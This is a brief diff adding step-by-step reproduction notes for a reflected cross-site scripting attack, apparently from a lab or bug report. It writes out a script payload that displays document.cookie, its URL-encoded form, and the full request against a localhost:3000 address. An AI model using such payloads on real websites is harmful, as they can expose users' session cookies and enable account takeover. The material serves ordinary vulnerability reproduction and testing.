@@ -1,0 +1,11 @@
+1. First construct a browser script and follow along with the process below.
+
+<script>alert(document.cookie)</script>
+
+2. Ensure brackets are encoded, i.e. "<" and ">" become "%3c" and "%3e" respectively.
+
+%3cscript%3ealert(document.cookie)%3c/script%3e
+
+3. Turn this script into a request by adding the website URL at the beginning.
+
+127.0.0.1:3000/%3cscript%3ealert(document.cookie)%3c/script%3e
